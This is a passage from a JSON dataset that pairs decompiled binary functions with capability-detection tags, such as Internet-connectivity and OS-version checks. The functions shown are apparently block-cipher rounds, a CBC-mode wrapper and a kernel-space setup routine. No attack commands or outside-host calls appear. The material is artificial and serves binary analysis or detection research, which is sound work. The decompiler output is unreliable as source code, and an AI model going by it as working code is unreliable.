            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002f810(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_ch + arg_8h[1];\n    uVar1 = uVar1 << (arg_ch[1] & 0x1f) | uVar1 >> (0x20U - arg_ch[1] & 0x1f);\n    var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ *arg_8h;\n    uVar1 = arg_ch[2] ^ var_8h;\n    uVar1 = uVar1 << (arg_ch[3] & 0x1f) | uVar1 >> (0x20U - arg_ch[3] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar1 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ arg_8h[1];\n    uVar1 = arg_ch[4] - var_ch;\n    uVar1 = uVar1 << (arg_ch[5] & 0x1f) | uVar1 >> (0x20U - arg_ch[5] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar1 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar1 = arg_ch[6] + var_8h;\n    uVar1 = uVar1 << (arg_ch[7] & 0x1f) | uVar1 >> (0x20U - arg_ch[7] & 0x1f);\n    var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar1 = arg_ch[8] ^ var_ch;\n    uVar1 = uVar1 << (arg_ch[9] & 0x1f) | uVar1 >> (0x20U - arg_ch[9] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar1 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar1 = arg_ch[10] - var_8h;\n    uVar1 = uVar1 << (arg_ch[0xb] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xb] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar1 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar1 = arg_ch[0xc] + var_ch;\n    uVar1 = uVar1 << (arg_ch[0xd] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xd] & 0x1f);\n    var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar1 = arg_ch[0xe] ^ var_8h;\n    uVar1 = uVar1 << (arg_ch[0xf] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xf] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar1 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar1 = arg_ch[0x10] - var_ch;\n    uVar1 = uVar1 << (arg_ch[0x11] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x11] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar1 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar1 = arg_ch[0x12] + var_8h;\n    uVar1 = uVar1 << (arg_ch[0x13] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x13] & 0x1f);\n    var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar1 = arg_ch[0x14] ^ var_ch;\n    uVar1 = uVar1 << (arg_ch[0x15] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x15] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar1 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar1 = arg_ch[0x16] - var_8h << (arg_ch[0x17] & 0x1f) | arg_ch[0x16] - var_8h >> (0x20U - arg_ch[0x17] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar1 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar1 >> 0x18) * 4 + -0x7ffad220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    if (arg_ch[0x20] == 0) {\n        uVar1 = arg_ch[0x18] + var_ch << (arg_ch[0x19] & 0x1f) | arg_ch[0x18] + var_ch >> (0x20U - arg_ch[0x19] & 0x1f);\n        var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n                 *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n        uVar1 = arg_ch[0x1a] ^ var_8h;\n        uVar1 = uVar1 << (arg_ch[0x1b] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x1b] & 0x1f);\n        var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar1 & 0xff) * 4 + -0x7ffad620)) +\n                 *((uVar1 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n        uVar1 = arg_ch[0x1c] - var_ch;\n        uVar1 = uVar1 << (arg_ch[0x1d] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x1d] & 0x1f);\n        var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar1 & 0xff) * 4 + -0x7ffad620) ^\n                 *((uVar1 >> 0x18) * 4 + -0x7ffad220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n        uVar1 = arg_ch[0x1e] + var_8h << (arg_ch[0x1f] & 0x1f) | arg_ch[0x1e] + var_8h >> (0x20U - arg_ch[0x1f] & 0x1f);\n        var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar1 & 0xff) * 4 + -0x7ffad620)) -\n                 *((uVar1 >> 0x18) * 4 + -0x7ffad220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    }\n    arg_8h[1] = var_8h;\n    *arg_8h = var_ch;\n    return;\n}\n",
        "token_count": 3303
    },
    "00030250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00030250(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = *arg_8h;\n    var_ch = arg_8h[1];\n    if (arg_ch[0x20] == 0) {\n        uVar4 = arg_ch[0x1e] + var_ch << (arg_ch[0x1f] & 0x1f) | arg_ch[0x1e] + var_ch >> (0x20U - arg_ch[0x1f] & 0x1f);\n        var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar4 & 0xff) * 4 + -0x7ffad620)) -\n                 *((uVar4 >> 0x18) * 4 + -0x7ffad220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n        uVar4 = arg_ch[0x1c] - var_8h;\n        uVar4 = uVar4 << (arg_ch[0x1d] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x1d] & 0x1f);\n        var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar4 & 0xff) * 4 + -0x7ffad620) ^\n                 *((uVar4 >> 0x18) * 4 + -0x7ffad220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n        uVar4 = arg_ch[0x1a] ^ var_ch;\n        uVar4 = uVar4 << (arg_ch[0x1b] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x1b] & 0x1f);\n        var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar4 & 0xff) * 4 + -0x7ffad620)) +\n                 *((uVar4 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n        uVar4 = arg_ch[0x18] + var_8h << (arg_ch[0x19] & 0x1f) | arg_ch[0x18] + var_8h >> (0x20U - arg_ch[0x19] & 0x1f);\n        var_ch = ((*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar4 & 0xff) * 4 + -0x7ffad620)) -\n                 *((uVar4 >> 0x18) * 4 + -0x7ffad220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    }\n    uVar4 = arg_ch[0x16] - var_ch << (arg_ch[0x17] & 0x1f) | arg_ch[0x16] - var_ch >> (0x20U - arg_ch[0x17] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar4 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = arg_ch[0x14] ^ var_8h;\n    uVar4 = uVar4 << (arg_ch[0x15] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x15] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar4 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar4 = arg_ch[0x12] + var_ch;\n    uVar4 = uVar4 << (arg_ch[0x13] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x13] & 0x1f);\n    var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar4 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = arg_ch[0x10] - var_8h;\n    uVar4 = uVar4 << (arg_ch[0x11] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x11] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar4 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar4 = arg_ch[0xe] ^ var_ch;\n    uVar4 = uVar4 << (arg_ch[0xf] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xf] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar4 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = arg_ch[0xc] + var_8h;\n    uVar4 = uVar4 << (arg_ch[0xd] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xd] & 0x1f);\n    var_ch = ((*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar4 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar4 = arg_ch[10] - var_ch;\n    uVar4 = uVar4 << (arg_ch[0xb] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xb] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar4 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = arg_ch[8] ^ var_8h;\n    uVar4 = uVar4 << (arg_ch[9] & 0x1f) | uVar4 >> (0x20U - arg_ch[9] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar4 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar4 = arg_ch[6] + var_ch;\n    uVar4 = uVar4 << (arg_ch[7] & 0x1f) | uVar4 >> (0x20U - arg_ch[7] & 0x1f);\n    var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) ^ *((uVar4 & 0xff) * 4 + -0x7ffad620)) -\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = arg_ch[4] - var_8h;\n    uVar4 = uVar4 << (arg_ch[5] & 0x1f) | uVar4 >> (0x20U - arg_ch[5] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) + *((uVar4 & 0xff) * 4 + -0x7ffad620) ^\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_ch;\n    uVar4 = arg_ch[2] ^ var_ch;\n    uVar4 = uVar4 << (arg_ch[3] & 0x1f) | uVar4 >> (0x20U - arg_ch[3] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x7ffada20) - *((uVar4 & 0xff) * 4 + -0x7ffad620)) +\n             *((uVar4 >> 0x18) * 4 + -0x7ffad220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x7fface20) ^ var_8h;\n    uVar4 = *arg_ch + var_8h;\n    uVar5 = uVar4 << (arg_ch[1] & 0x1f) | uVar4 >> (0x20U - arg_ch[1] & 0x1f);\n    uVar4 = *((uVar5 >> 8 & 0xff) * 4 + -0x7ffada20);\n    uVar1 = *((uVar5 & 0xff) * 4 + -0x7ffad620);\n    iVar2 = *((uVar5 >> 0x18) * 4 + -0x7ffad220);\n    iVar3 = *((uVar5 >> 0x10 & 0xff) * 4 + -0x7fface20);\n    arg_8h[1] = var_8h;\n    *arg_8h = ((uVar4 ^ uVar1) - iVar2) + iVar3 ^ var_ch;\n    return;\n}\n",
        "token_count": 3366
    },
    "00030ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Switch with 1 destination removed at 0x00030f86\n// WARNING: Switch with 1 destination removed at 0x000315a3\n\nvoid __cdecl\nfcn.00030ca0(uint8_t *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_1ch == 0) {\n        var_1ch = arg_18h[7] | arg_18h[6] << 8 | arg_18h[5] << 0x10 | arg_18h[4] << 0x18;\n        var_4h = arg_18h[3] | arg_18h[2] << 8 | arg_18h[1] << 0x10 | *arg_18h << 0x18;\n        for (var_24h = arg_10h + -8; -1 < var_24h; var_24h = var_24h + -8) {\n            uVar9 = arg_8h[3] | arg_8h[2] << 8 | arg_8h[1] << 0x10 | *arg_8h << 0x18;\n            uVar10 = arg_8h[7] | arg_8h[6] << 8 | arg_8h[5] << 0x10 | arg_8h[4] << 0x18;\n            arg_8h = arg_8h + 8;\n            var_14h = uVar9;\n            var_10h = uVar10;\n            fcn.00030250(&var_14h, arg_14h);\n            var_ch = var_14h ^ var_4h;\n            var_8h = var_10h ^ var_1ch;\n            *arg_ch = var_ch >> 0x18;\n            arg_ch[1] = var_ch >> 0x10;\n            arg_ch[2] = var_ch >> 8;\n            arg_ch[3] = var_ch;\n            arg_ch[4] = var_8h >> 0x18;\n            arg_ch[5] = var_8h >> 0x10;\n            arg_ch[6] = var_8h >> 8;\n            arg_ch[7] = var_8h;\n            arg_ch = arg_ch + 8;\n            var_1ch = uVar10;\n            var_4h = uVar9;\n        }\n        if (var_24h != -8) {\n            uVar9 = arg_8h[3] | arg_8h[2] << 8 | arg_8h[1] << 0x10 | *arg_8h << 0x18;\n            var_1ch = arg_8h[7] | arg_8h[6] << 8 | arg_8h[5] << 0x10 | arg_8h[4] << 0x18;\n            var_14h = uVar9;\n            var_10h = var_1ch;\n            fcn.00030250(&var_14h, arg_14h);\n            var_4h = uVar9;\n            if (var_24h + 7U < 8) {\n                return;\n            }\n        }\n        *arg_18h = var_4h >> 0x18;\n        arg_18h[1] = var_4h >> 0x10;\n        arg_18h[2] = var_4h >> 8;\n        arg_18h[3] = var_4h;\n        arg_18h[4] = var_1ch >> 0x18;\n        arg_18h[5] = var_1ch >> 0x10;\n        arg_18h[6] = var_1ch >> 8;\n        arg_18h[7] = var_1ch;\n    }\n    else {\n        var_ch = arg_18h[3] | arg_18h[2] << 8 | arg_18h[1] << 0x10 | *arg_18h << 0x18;\n        var_8h = arg_18h[7] | arg_18h[6] << 8 | arg_18h[5] << 0x10 | arg_18h[4] << 0x18;\n        for (var_24h = arg_10h + -8; -1 < var_24h; var_24h = var_24h + -8) {\n            uVar1 = *arg_8h;\n            puVar2 = arg_8h + 1;\n            puVar3 = arg_8h + 2;\n            puVar4 = arg_8h + 3;\n            puVar5 = arg_8h + 4;\n            puVar6 = arg_8h + 5;\n            puVar7 = arg_8h + 6;\n            puVar8 = arg_8h + 7;\n            arg_8h = arg_8h + 8;\n            var_14h = (*puVar4 | *puVar3 << 8 | *puVar2 << 0x10 | uVar1 << 0x18) ^ var_ch;\n            var_10h = (*puVar8 | *puVar7 << 8 | *puVar6 << 0x10 | *puVar5 << 0x18) ^ var_8h;\n            fcn.0002f810(&var_14h, arg_14h);\n            var_ch = var_14h;\n            var_8h = var_10h;\n            *arg_ch = var_14h >> 0x18;\n            arg_ch[1] = var_14h >> 0x10;\n            arg_ch[2] = var_14h >> 8;\n            arg_ch[3] = var_14h;\n            arg_ch[4] = var_10h >> 0x18;\n            arg_ch[5] = var_10h >> 0x10;\n            arg_ch[6] = var_10h >> 8;\n            arg_ch[7] = var_10h;\n            arg_ch = arg_ch + 8;\n        }\n        if (var_24h != -8) {\n            if (var_24h + 7U < 8) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_14h = var_ch;\n            var_10h = var_8h;\n            fcn.0002f810(&var_14h, arg_14h);\n            var_ch = var_14h;\n            var_8h = var_10h;\n            *arg_ch = var_14h >> 0x18;\n            arg_ch[1] = var_14h >> 0x10;\n            arg_ch[2] = var_14h >> 8;\n            arg_ch[3] = var_14h;\n            arg_ch[4] = var_10h >> 0x18;\n            arg_ch[5] = var_10h >> 0x10;\n            arg_ch[6] = var_10h >> 8;\n            arg_ch[7] = var_10h;\n        }\n        *arg_18h = var_ch >> 0x18;\n        arg_18h[1] = var_ch >> 0x10;\n        arg_18h[2] = var_ch >> 8;\n        arg_18h[3] = var_ch;\n        arg_18h[4] = var_8h >> 0x18;\n        arg_18h[5] = var_8h >> 0x10;\n        arg_18h[6] = var_8h >> 8;\n        arg_18h[7] = var_8h;\n    }\n    return;\n}\n",
        "token_count": 1984
    },
    "000326f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000326f0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_EDX;\n    uint *puVar2;\n    uint *noname_0;\n    int32_t var_ddh;\n    uint var_d8h;\n    uint var_d4h;\n    uint *var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint32_t var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    \n    if (*0x800ce671 == '\\0') {\n        if (*0x800ce3c4 == 0) {\n            *NULL = -0x3fffffff;\n        }\n        else {\n            fcn.000326e0(0x800ce6d0);\n            (**0x800510d0)(0x800ce6d4, 1, 0);\n            fcn.000326c0(0x800ce6c8);\n            noname_0 = extraout_EDX & 0xffffff00 | arg_8h & 0xff;\n            *NULL = fcn.00033ea0(noname_0, &var_ddh);\n            if (*NULL == 0) {\n                fcn.0002bfa0(&var_a8h, 0x52);\n                fcn.000789c0(&var_c0h, &var_a8h);\n                iVar1 = *0x800ce3c4;\n                *NULL = (**0x800511a0)(*0x800ce3c4, 0, &var_c0h, 7, 1, 0, 0x800ce6c0);\n                if ((*NULL == 0) && (noname_0 = *0x800ce6c0,  *NULL = fcn.00033e30(*0x800ce6c0),  *NULL == 0)) {\n                    (*0x800ce6c0)[7] = (*0x800ce6c0)[7] | 0x10;\n                    (*0x800ce6c0)[7] = (*0x800ce6c0)[7] & 0xffffff7f;\n                    noname_0 = *0x800ce6c0;\n                    *NULL = fcn.00016000(*0x800ce6c0, 0x80072c80, 0);\n                    if (*NULL == 0) {\n                        var_d8h = 0x18;\n                        var_d4h = 0;\n                        var_cch = 0;\n                        var_d0h = NULL;\n                        var_c8h = 0;\n                        var_c4h = 0;\n                        *0x800ce6b8 = 0x1000000;\n                        *0x800ce6bc = 0;\n                        noname_0 = 0x800ce6a4;\n                        *NULL = fcn.00078b0a(iVar1, 6, &var_d8h, 0x800ce6b8, 4, 0x18000000, 0);\n                        if (*NULL == 0) {\n                            var_b8h = *0x800ce6b8;\n                            noname_0 = *0x800ce6a4;\n                            *NULL = fcn.00078af8();\n                            if (*NULL == 0) {\n                                *0x800ce6b8 = var_b8h;\n                                *0x800ce6bc = 0;\n                                fcn.0002bfd0(&var_a8h, 0x52);\n                                puVar2 = &var_a8h;\n                                fcn.000789c0(&var_c0h, puVar2);\n                                *NULL = (**0x800511a0)(*0x800ce3c4, 0, &var_c0h, 7, 1, 0, 0x800ce6c4);\n                                if ((*NULL == 0) &&\n                                   (noname_0 = *0x800ce6c4,  *NULL = fcn.00033e30(*0x800ce6c4),  *NULL == 0)) {\n                                    (*0x800ce6c4)[7] = (*0x800ce6c4)[7] | 0x10;\n                                    (*0x800ce6c4)[7] = (*0x800ce6c4)[7] & 0xffffff7f;\n                                    noname_0 = *0x800ce6c4;\n                                    *NULL = fcn.00016000(*0x800ce6c4, 0x80072c80, 0);\n                                    if (*NULL == 0) {\n                                        fcn.00034180(1, *0x800ce6b8, 2, *0x800ce6b8 >> 0xf, 0x20, 0x200);\n                                        *0x800ce672 = 0;\n                                        noname_0 = 0x800ce6e4;\n                                        *NULL = fcn.0001ace0(0x800ce6e4, 0x800739c0, 0);\n                                        if (*NULL == 0) {\n                                            *0x800ce671 = '\\x01';\n                                            if (var_ddh == '\\0') {\n                                                fcn.0002bfa0(&var_a8h, 0x52);\n                                                fcn.000789c0(&var_c0h, &var_a8h);\n                                                var_d8h = 0x18;\n                                                var_d4h = 0;\n                                                var_cch = 0x40;\n                                                var_d0h = &var_c0h;\n                                                var_c8h = 0;\n                                                var_c4h = 0;\n                                                noname_0 = &var_b4h;\n                                                iVar1 = fcn.000789de(puVar2, 0x80000000, &var_d8h, &var_b0h, 7, 0);\n                                                if (iVar1 == 0) {\n                                                    fcn.000789b4();\n                                                    noname_0 = var_b4h;\n                                                }\n                                                else {\n                                                    var_ddh._0_1_ = '\\x01';\n                                                }\n                                            }\n                                            if (var_ddh != '\\0') {\n                                                noname_0 = NULL;\n                                                fcn.00034180(0, *0x800ce6b0, 2, *0x800ce6b0 >> 0xf, 0x20, 0x200);\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (stack0xffffff20 != 0) {\n                if (*0x800ce6c0 != NULL) {\n                    (**0x8005117c)(*0x800ce6c0, noname_0);\n                    fcn.000160b0(*0x800ce6c0);\n                    *0x800ce6c0 = NULL;\n                }\n                if (*0x800ce6c4 != NULL) {\n                    (**0x8005117c)(*0x800ce6c4);\n                    fcn.000160b0(*0x800ce6c4);\n                    *0x800ce6c4 = NULL;\n                }\n                if (*0x800ce6ac != 0) {\n                    fcn.00078b04(0xffffffff, *0x800ce6ac);\n                    *0x800ce6ac = 0;\n                }\n                if (*0x800ce6a4 != NULL) 